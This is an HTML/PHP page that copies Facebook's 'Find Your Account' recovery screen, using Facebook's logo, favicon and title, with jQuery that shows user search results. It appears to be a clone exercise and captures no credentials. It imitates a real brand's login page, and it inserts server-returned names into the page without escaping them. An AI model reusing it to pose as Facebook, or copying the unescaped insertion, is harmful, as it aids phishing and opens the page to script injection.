<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <?php include_once '../../php/link.php' ?>
    <title>Forgotten Password | Can't Log In | Facebook</title>
    <style>
        .nav-link.text-primary:hover {
            text-decoration: underline;
        }
        .help_identify form{
            box-shadow: 0px 0px 1px 5px #ECEEF1;
            background: #FFFFFF;
        }
        .help_identify{
            width: 50%;
        }
        @media (max-width: 1024px){
            .help_identify{
                width: 100%;
            }
        }
    </style>
</head>
<body style="background: #F0F2F5;">
    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container-fluid">
            <!-- Brand/logo -->
            <img class="" style="height: 45px;" src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg" alt="Facebook" />

            <!-- "Log in" button for larger screens -->
            <button class="btn btn-primary fw-bold d-lg-none d-sm-block" type="submit" style="white-space: nowrap;" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" onclick="window.location.href='../../index.php'">Log in</button>

            <!-- Navbar links -->
            <div class="collapse navbar-collapse justify-content-end">
            <ul class="navbar-nav">
                <form class="d-flex" role="search">
                    <input class="form-control me-2" type="text" placeholder="Email or phone">
                    <input class="form-control me-2" type="password" placeholder="Password">
                    <button class="btn btn-primary fw-bold" type="submit" style="white-space: nowrap;">Log in</button>
                    <li class="nav-item">
                        <a class="nav-link text-primary" href="../../index.php" style="white-space: nowrap;">Forgotten account?</a>
                    </li>
                </form>
            </ul>
            </div>
        </div>
    </nav>


    <!-- form find account -->
    <div class="container mt-5">
        <div id="account_search" class="d-flex justify-content-center">
            <div class="help_identify" id="login_help">
                <form class="p-4 rounded">
                <h4>Find Your Account</h4>
                <hr>
                <p class="" style="font-size: 18px;">Please enter your email address or mobile number to search for your account.</p>
                <div class=""></div>
                <div class="mb-4">
                    <input type="search" class="form-control" style="padding: 15px;" id="userSearch" aria-describedby="emailHelp" placeholder="Email address or mobile number">
                </div>
                <hr>
                <div class="d-flex justify-content-end gap-1">
                    <a href="../../index.php" class="btn bg-secondary text-white" style="padding: 6px 30px 6px 30px;">Cancel</a>
                    <button type="button" id="searchUser" class="btn btn-primary" style="padding: 5px 30px 5px 30px;font-size: 18px;" data-bs-toggle="modal" data-bs-target="#staticBackdrop">Search</button>
                </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal User-->
    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
            <div class="modal-header">
                <h1 class="modal-title fs-5" id="staticBackdropLabel">Identify your account</h1>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p style="font-size: 18px;">These accounts matched your search.</p>
                <div class="d-flex flex-wrap" id="userResults">
                    <!-- show data get from jquery-->
                    <!-- <img src="../userImg/logoUser.png" alt="logoUser" style="width: 50px;">
                    <div class="d-flex justify-content-between align-items-center" style="width: 100%;">
                        <div class="d-flex flex-column ms-3">
                            <span>Firstname + surname</span>
                            <span style="font-size: 14px;">Facebook user</span>
                        </div>
                        <div class="">
                            <button type="button" class="btn btn-secondary">This is my account</button>
                        </div>
                    </div> -->
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Back</button>
                <button type="button" class="btn btn-primary">I Am Not In This List</button>
            </div>
            </div>
        </div>
    </div>

    <!-- <script>
        $(document).ready(function () {
            $("#searchUser").click(function () {
                var searchQuery = ''; // Replace with your search query logic

                // Make an AJAX request to fetch user data
                $.ajax({
                    type: "GET",
                    url: "../../php/search_users.php",
                    data: {
                        search: 'true',
                        query: searchQuery
                    },
                    dataType: "json",
                    success: function (data) {
                        var userResults = $("#userResults");
                        userResults.empty(); // Clear previous results

                        $.each(data, function (index, user) {
                            var userEntry = `
                                <div class="d-flex mb-3" style="width: 100%;">
                                    <img src="../userImg/logoUser.png" alt="logoUser" style="width: 50px;">
                                    <div class="d-flex justify-content-between align-items-center" style="width: 100%;">
                                        <div class="d-flex flex-column ms-3">
                                            <span>${user.first_name} ${user.surname}</span>
                                            <span style="font-size: 14px;">Facebook user</span>
                                        </div>
                                        <div class="d-flex align-items-center justify-content-center">
                                            <button type="button" class="btn btn-secondary">This is my account</button>
                                        </div>
                                    </div>
                                </div>
                            `;
                            userResults.append(userEntry);
                        });
                    },
                    error: function () {
                        alert("Error fetching user data.");
                    },
                });
            });
        });
    </script> -->

    <script>
        $(document).ready(function() {
            $('#searchUser').click(function() {
                var searchQuery = $('#userSearch').val();

                // Make an AJAX request to fetch user data
                $.ajax({
                    url: '../../php/search_users.php', // Replace with the actual URL to fetch user data
                    type: 'POST',
                    data: { searchQuery: searchQuery },
                    success: function(response) {
                        // Parse the response JSON (assuming it's JSON data)
                        var userData = JSON.parse(response);
                        console.log(userData);
                        // Update the modal content with the user data
                        var userResultsContainer = $('#userResults');
                        userResultsContainer.empty();

                        if (userData.length > 0) {
                            userData.forEach(function(user) {
                                var userEntry = `
                                    <div class="d-flex mb-3 align-items-center" style="width: 100%;">
                                        <img src="../userImg/logoUser.png" alt="logoUser" style="width: 50px;">
                                        <div class="d-flex justify-content-between align-items-center" style="width: 100%;">
                                            <div class="d-flex flex-column ms-3">
                                                <span>${user.first_name} ${user.surname}</span>
                                                <span style="font-size: 14px;">Facebook user</span>
                                            </div>
                                            <div class="d-flex align-items-center justify-content-center">
                                                <button type="button" class="btn btn-secondary">This is my account</button>
                                            </div>
                                        </div>
                                    </div>
                                `;
                                // var userImage = $('<img src="../userImg/logoUser.png" alt="logoUser" style="width: 50px;">');
                                // var userDiv = $('<div class="d-flex justify-content-between align-items-center" style="width: 100%;">');
                                // // var userImage = $('<img src="' + user.profile_image + '" alt="User" style="width: 50px;">');
                                // var userInfo = $('<div class="d-flex flex-column ms-3"><span>' + user.first_name + ' ' + user.surname + '</span><span style="font-size: 14px;">Facebook user</span></div>');
                                // var userButton = $('<div><button type="button" class="btn btn-secondary">This is my account</button></div>');

                                // userDiv.append(userImage, userInfo, userButton);
                                userResultsContainer.append(userEntry);
                            });
                        } else {
                            userResultsContainer.html('<p>No accounts found.</p>');
                        }
                    },
                    error: function() {
                        alert('Error fetching user data.');
                    }
                });
            });
        });
    </script>

</body>
</html>
